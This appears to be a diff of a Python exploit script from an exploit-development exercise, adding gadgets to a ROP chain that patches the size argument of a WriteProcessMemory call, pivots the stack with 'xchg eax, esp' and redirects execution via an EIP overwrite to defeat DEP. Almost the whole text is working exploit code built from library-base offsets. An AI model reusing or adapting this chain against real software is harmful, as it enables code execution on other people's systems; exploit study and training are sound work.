@@ -431,8 +431,8 @@ def main():
         #
         # IGNORE THE ABOVE. REASON:
         #                         restarting the PC gave me a new base address and so now it works as expected
-        eip = pack("<L", (libraryBase + 0x00087E3B))   # (0x03117e3b) int3; int3; int3; int3; int3; ret; <- debugging
-        eip += pack("<L", (libraryBase + 0x000408D6))  # (0x030d08d6) push esp; pop esi; ret <- Save ESP to ESI
+        # eip = pack("<L", (libraryBase + 0x00087E3B))  # (0x03117e3b) int3; int3; int3; int3; int3; ret; <- debugging
+        eip = pack("<L", (libraryBase + 0x000408D6))  # (0x030d08d6) push esp; pop esi; ret <- Save ESP to ESI
         # eip = pack("<L", (0x41424345))  # push esp; pop esi; ret <- Save ESP to ESI
 
         # ! DEBUG: eip: 0x030d08d6
@@ -466,6 +466,34 @@ def main():
         rop += pack("<L", (0xFFFFFEE0))  # pop into eax
         rop += pack("<L", (libraryBase + 0x1D0F0))  # add eax, ecx ; ret
         rop += pack("<L", (libraryBase + 0x1FD8))  # mov [eax], ecx ; ret
+
+        # 1803_1046:
+        # Patching nSize arg
+        rop += pack("<L", (libraryBase + 0xBC79))  # inc eax; ret
+        rop += pack("<L", (libraryBase + 0xBC79))  # inc eax; ret
+        rop += pack("<L", (libraryBase + 0xBC79))  # inc eax; ret
+        rop += pack("<L", (libraryBase + 0xBC79))  # inc eax; ret
+        rop += pack("<L", (libraryBase + 0x408DD))  # push eax; pop esi; ret
+        rop += pack("<L", (libraryBase + 0x48D8C))  # pop eax; ret
+        rop += pack("<L", (0xFFFFFDF4))  # -524
+        rop += pack("<L", (libraryBase + 0x1D8C2))  # neg eax ; ret
+        rop += pack("<L", (libraryBase + 0x8876D))  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
+        rop += pack("<L", (0x42424242))  # junk into esi
+        # rop += pack("<L", (libraryBase + 0x00087E3B))  # (0x03117e3b) int3; int3; int3; int3; int3; ret; <- debugging
+        rop += pack("<L", (libraryBase + 0x1FD8))  # mov [eax], ecx ; ret
+        rop += pack("<L", (0x42424242))  # junk for ret 0x10
+        rop += pack("<L", (0x42424242))  # junk for ret 0x10
+        rop += pack("<L", (0x42424242))  # junk for ret 0x10
+        rop += pack("<L", (0x42424242))  # junk for ret 0x10
+
+        # 1803_1057:
+        # Align ESP with ROP Skeleton
+        # EAX points 0x14 bytes ahead of WPM on stack
+        # This will jump my flow straight up towards the WPM address call
+        rop += pack("<L", (libraryBase + 0x117C))  # pop ecx ; ret
+        rop += pack("<L", (0xFFFFFFEC))  # -0x14
+        rop += pack("<L", (libraryBase + 0x1D0F0))  # add eax, ecx ; ret
+        rop += pack("<L", (libraryBase + 0x5B415))  # xchg eax, esp ; ret
 
         # Padding (Followed the vid)
         padding = b"D" * (0x600 - 276 - 4 - len(rop))
